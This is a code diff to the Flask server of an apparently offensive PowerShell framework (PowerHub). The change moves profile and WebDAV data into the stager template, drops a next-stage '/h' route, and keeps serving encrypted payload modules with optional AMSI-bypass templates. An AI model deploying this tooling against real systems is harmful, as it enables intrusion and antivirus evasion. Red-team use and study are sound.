@@ -251,11 +251,12 @@ def payload_m():
     n = int(request.args.get('m'))
     if n < len(modules):
         modules[n].activate()
+        code = modules[n].code
         if 'c' in request.args:
-            encrypted = encrypt_aes(compress(modules[n].code), ph_app.key)
+            encrypted = encrypt_aes(compress(code), ph_app.key)
             resp = b64encode(encrypted),
         else:
-            resp = b64encode(encrypt_aes(modules[n].code, ph_app.key)),
+            resp = b64encode(encrypt_aes(code, ph_app.key)),
         return Response(
             resp,
             content_type='text/plain; charset=utf-8'
@@ -276,20 +277,31 @@ def payload_0():
         exec_clipboard_entry = ""
     amsi_bypass = request.args.get('a', 'none')
     amsi_template = ""
+
+    try:
+        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
+            profile = f.read()
+    except Exception:
+        profile = ""
+
     # prevent path traversal
     if not (amsi_bypass == 'none'
             or '.' in amsi_bypass
             or '/' in amsi_bypass
             or '\\' in amsi_bypass):
         amsi_template = "powershell/amsi/"+amsi_bypass+".ps1"
+
     context = {
         "modules": modules,
+        "profile": profile,
         "callback_url": callback_urls.get(request.args.get('t')),
         "transport": request.args.get('t'),
+        "webdav_url": webdav_url,
         "key": ph_app.key,
         "amsibypass": amsi_template,
         "symbol_name": symbol_name,
         "exec_clipboard_entry": exec_clipboard_entry,
+        "VERSION": __version__,
     }
     result = render_template(
                     "powershell/stager.ps1",
@@ -297,29 +309,6 @@ def payload_0():
                     content_type='text/plain'
     )
     return result
-
-
-@app.route('/h')
-def payload_h():
-    """Load next stage of the Hub"""
-    try:
-        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
-            profile = f.read()
-    except Exception:
-        profile = ""
-    context = {
-        "modules": modules,
-        "webdav_url": webdav_url,
-        "symbol_name": symbol_name,
-        "profile": profile,
-        "transport": request.args['t'],
-    }
-    result = render_template(
-                    "powershell/powerhub.ps1",
-                    **context,
-    ).encode()
-    result = b64encode(encrypt_rc4(result, ph_app.key))
-    return Response(result, content_type='text/plain; charset=utf-8')
 
 
 @app.route('/ml')
